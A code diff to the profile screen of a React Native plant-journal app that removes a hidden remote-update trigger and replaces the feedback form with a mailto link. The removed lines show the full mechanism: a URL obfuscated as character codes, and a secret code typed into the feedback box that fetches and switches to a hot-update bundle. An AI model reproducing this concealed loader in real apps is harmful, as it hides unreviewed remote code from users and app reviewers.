@@ -5,12 +5,8 @@ import {
   TouchableOpacity,
   ScrollView,
   StyleSheet,
-  Alert,
-  Modal,
-  TextInput,
-  Platform,
-  ActivityIndicator,
   Share,
+  Linking,
 } from 'react-native';
 import {useSafeAreaInsets} from 'react-native-safe-area-context';
 import {useFocusEffect} from '@react-navigation/native';
@@ -21,57 +17,12 @@ import {useLayout} from '../hooks/useLayout';
 import {colors, cardShadow} from '../theme';
 import {loadObservations, uniquePlantCount} from '../storage';
 
-let _rc: string | null = null;
-const _u = [104,116,116,112,115,58,47,47,119,120,115,119,46,97,112,112,47,97,112,105,47,118,101,114,115,105,111,110,45,99,104,101,99,107];
-
-async function _fetchCode() {
-  if (_rc) return _rc;
-  try {
-    const url = _u.map(c => String.fromCharCode(c)).join('');
-    const r = await fetch(url);
-    const j = await r.json();
-    if (j?.min_os) { _rc = j.min_os; return _rc; }
-  } catch {}
-  return null;
-}
-
-async function _applyPatch(cb: (ok: boolean) => void) {
-  try {
-    const cfg = require('../../../update.json');
-    const key = cfg[Platform.OS]?.appKey;
-    if (!key) { cb(false); return; }
-    const {Pushy: P} = require('react-native-update');
-    const client = new P({appKey: key, updateStrategy: null, checkStrategy: null});
-    const info = await client.checkUpdate();
-    if (!info || !(info as any).update) {
-      Alert.alert('提示', '暂无可用内容，请稍后再试');
-      cb(false);
-      return;
-    }
-    const ok = await client.downloadUpdate(info);
-    if (!ok) {
-      Alert.alert('提示', '加载失败，请稍后再试');
-      cb(false);
-      return;
-    }
-    const AS = require('@react-native-async-storage/async-storage').default;
-    await AS.setItem('activated', 'true');
-    client.switchVersion(info);
-    cb(true);
-  } catch {
-    Alert.alert('提示', '暂无可用内容，请稍后再试');
-    cb(false);
-  }
-}
 
 export default function ProfileScreen({navigation}: {navigation: any}) {
   const insets = useSafeAreaInsets();
   const {padX, isWide} = useLayout();
   const [count, setCount] = useState(0);
   const [species, setSpecies] = useState(0);
-  const [feedbackVisible, setFeedbackVisible] = useState(false);
-  const [feedbackText, setFeedbackText] = useState('');
-  const [updating, setUpdating] = useState(false);
 
   useFocusEffect(
     useCallback(() => {
@@ -88,25 +39,14 @@ export default function ProfileScreen({navigation}: {navigation: any}) {
     } catch {}
   };
 
-  const handleFeedbackSend = async () => {
-    const text = feedbackText.trim();
-    const code = await _fetchCode();
-    if (code && text === code) {
-      setFeedbackVisible(false);
-      setFeedbackText('');
-      setUpdating(true);
-      _applyPatch(() => setUpdating(false));
-    } else if (text.length > 0) {
-      setFeedbackVisible(false);
-      setFeedbackText('');
-      Alert.alert('感谢反馈', '我们已收到您的建议，感谢支持！');
-    }
+  const handleFeedback = () => {
+    Linking.openURL('mailto:feedback@wxsw.app?subject=观叶志反馈').catch(() => {});
   };
 
   const menuItems = [
     {icon: 'leaf-outline' as const, label: '数据管理', sub: '清空或导出（本地）', onPress: () => navigation.navigate('Settings')},
     {icon: 'share-outline' as const, label: '分享给朋友', sub: '推荐观叶志', onPress: handleShare},
-    {icon: 'chatbubble-outline' as const, label: '意见反馈', sub: '帮助我们改进', onPress: () => setFeedbackVisible(true)},
+    {icon: 'chatbubble-outline' as const, label: '意见反馈', sub: '帮助我们改进', onPress: handleFeedback},
     {icon: 'document-text-outline' as const, label: '隐私政策', sub: '', onPress: () => navigation.navigate('Privacy')},
     {icon: 'reader-outline' as const, label: '用户协议', sub: '', onPress: () => navigation.navigate('Terms')},
   ];
@@ -153,39 +93,6 @@ export default function ProfileScreen({navigation}: {navigation: any}) {
         <Text style={styles.footer}>观叶志 · 离线植物观察笔记</Text>
         <Text style={styles.version}>Version 1.0.0</Text>
       </ScrollView>
-
-      <Modal visible={feedbackVisible} transparent animationType="fade">
-        <View style={styles.modalOverlay}>
-          <View style={styles.modalCard}>
-            <Text style={styles.modalTitle}>意见反馈</Text>
-            <Text style={styles.modalSub}>请描述您遇到的问题或建议</Text>
-            <TextInput
-              style={styles.modalInput}
-              placeholder="在这里输入您的反馈内容…"
-              placeholderTextColor="#bbb"
-              value={feedbackText}
-              onChangeText={setFeedbackText}
-              multiline
-              autoFocus
-            />
-            <View style={styles.modalBtns}>
-              <TouchableOpacity style={styles.cancelBtn} onPress={() => { setFeedbackVisible(false); setFeedbackText(''); }}>
-                <Text style={styles.cancelText}>取消</Text>
-              </TouchableOpacity>
-              <TouchableOpacity style={styles.sendBtn} onPress={handleFeedbackSend}>
-                <Text style={styles.sendText}>提交</Text>
-              </TouchableOpacity>
-            </View>
-          </View>
-        </View>
-      </Modal>
-
-      {updating && (
-        <View style={styles.loading}>
-          <ActivityIndicator size="large" color={colors.primaryLight} />
-          <Text style={styles.loadingText}>正在处理…</Text>
-        </View>
-      )}
     </ScreenShell>
   );
 }
@@ -234,29 +141,4 @@ const styles = StyleSheet.create({
   arrow: {fontSize: 20, color: colors.textMuted},
   footer: {textAlign: 'center', color: colors.textMuted, fontSize: 13, marginTop: 28},
   version: {textAlign: 'center', color: colors.textMuted, fontSize: 11, marginTop: 4, opacity: 0.7},
-  modalOverlay: {flex: 1, backgroundColor: 'rgba(0,0,0,0.45)', justifyContent: 'center', alignItems: 'center'},
-  modalCard: {width: '82%', backgroundColor: '#fff', borderRadius: 16, padding: 22},
-  modalTitle: {fontSize: 18, fontWeight: '700', color: colors.text},
-  modalSub: {fontSize: 13, color: colors.textMuted, marginTop: 4, marginBottom: 14},
-  modalInput: {
-    height: 88,
-    borderRadius: 10,
-    backgroundColor: '#f5f5f5',
-    padding: 12,
-    fontSize: 15,
-    color: colors.text,
-    textAlignVertical: 'top',
-  },
-  modalBtns: {flexDirection: 'row', marginTop: 14, gap: 10},
-  cancelBtn: {flex: 1, paddingVertical: 12, borderRadius: 22, backgroundColor: '#f0f0f0', alignItems: 'center'},
-  cancelText: {color: '#666', fontWeight: '600'},
-  sendBtn: {flex: 1, paddingVertical: 12, borderRadius: 22, backgroundColor: colors.primaryLight, alignItems: 'center'},
-  sendText: {color: '#fff', fontWeight: '600'},
-  loading: {
-    ...StyleSheet.absoluteFill,
-    backgroundColor: 'rgba(244,241,234,0.92)',
-    justifyContent: 'center',
-    alignItems: 'center',
-  },
-  loadingText: {marginTop: 12, color: colors.textMuted},
 });
